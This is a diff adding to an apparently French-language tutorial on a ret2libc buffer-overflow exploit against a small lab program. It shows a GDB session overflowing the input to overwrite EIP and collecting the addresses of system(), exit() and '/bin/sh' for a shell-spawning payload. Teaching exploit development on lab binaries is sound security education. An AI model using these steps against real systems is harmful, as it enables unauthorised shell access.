@@ -69,4 +69,69 @@ Ensuite, une petite compilation est nécessaire :
     
 Nous pouvons aperçevoir que le programme plante après 22 caractères, donc l'`OFFSET` correspond exactement à 22 caractères, si nous effectuons un dépassement, la sauvegarde `sEIP` sera complètement écrasé et le programme plantera automatiquement.
 
+Nous allons lancer `GDB` (GNU Debugger), et nous allons chercher l'adresse de la fonction `system();`, `exit();` et finalement une chaîne comme `/bin/sh` qui nous permettra de lancer cette commande en particulier.
+
+    root@0xEX75:~/libc# gdb ./libc
+    GNU gdb (Debian 8.3.1-1) 8.3.1
+    Copyright (C) 2019 Free Software Foundation, Inc.
+    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+    This is free software: you are free to change and redistribute it.
+    There is NO WARRANTY, to the extent permitted by law.
+    Type "show copying" and "show warranty" for details.
+    This GDB was configured as "x86_64-linux-gnu".
+    Type "show configuration" for configuration details.
+    For bug reporting instructions, please see:
+    <http://www.gnu.org/software/gdb/bugs/>.
+    Find the GDB manual and other documentation resources online at:
+        <http://www.gnu.org/software/gdb/documentation/>.
+
+    For help, type "help".
+    Type "apropos word" to search for commands related to "word"...
+    Reading symbols from ./libc...
+    (No debugging symbols found in ./libc)
+    gdb-peda$ r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+    Starting program: /root/libc/libc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+    Your name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+    Program received signal SIGSEGV, Segmentation fault.
+    [----------------------------------registers-----------------------------------]
+    EAX: 0x54 ('T')
+    EBX: 0x41414141 ('AAAA')
+    ECX: 0x7fffffac 
+    EDX: 0xf7fae010 --> 0x0 
+    ESI: 0xf7fac000 --> 0x1d6d6c 
+    EDI: 0xf7fac000 --> 0x1d6d6c 
+    EBP: 0x41414141 ('AAAA')
+    ESP: 0xffffd290 ('A' <repeats 45 times>)
+    EIP: 0x41414141 ('AAAA')
+    EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+    [-------------------------------------code-------------------------------------]
+    Invalid $PC address: 0x41414141
+    [------------------------------------stack-------------------------------------]
+    0000| 0xffffd290 ('A' <repeats 45 times>)
+    0004| 0xffffd294 ('A' <repeats 41 times>)
+    0008| 0xffffd298 ('A' <repeats 37 times>)
+    0012| 0xffffd29c ('A' <repeats 33 times>)
+    0016| 0xffffd2a0 ('A' <repeats 29 times>)
+    0020| 0xffffd2a4 ('A' <repeats 25 times>)
+    0024| 0xffffd2a8 ('A' <repeats 21 times>)
+    0028| 0xffffd2ac ('A' <repeats 17 times>)
+    [------------------------------------------------------------------------------]
+    Legend: code, data, rodata, value
+    Stopped reason: SIGSEGV
+    0x41414141 in ?? ()
+    gdb-peda$ p system
+    $1 = {<text variable, no debug info>} 0xf7e17660 <system> # ADDRESS FUNCTION SYSTEM
+    gdb-peda$ p exit
+    $2 = {<text variable, no debug info>} 0xf7e0a6f0 <exit> # ADDRESS FUNCTION EXIT
+    gdb-peda$ searchmem "/bin/sh"
+    Searching for '/bin/sh' in: None ranges
+    Found 1 results, display max 1 items:
+    libc : 0xf7f54f68 ("/bin/sh") # ADDRESS /BIN/SH
+    
+Donc, nous avons réussis à capturer les adresses de `system();`, `exit()` et finalement de la chaîne "`/bin/sh"`.
+
+- system(); : 0xf7e17660
+- exit();   : 0xf7e0a6f0
+- /bin/sh   : 0xf7f54f68
 
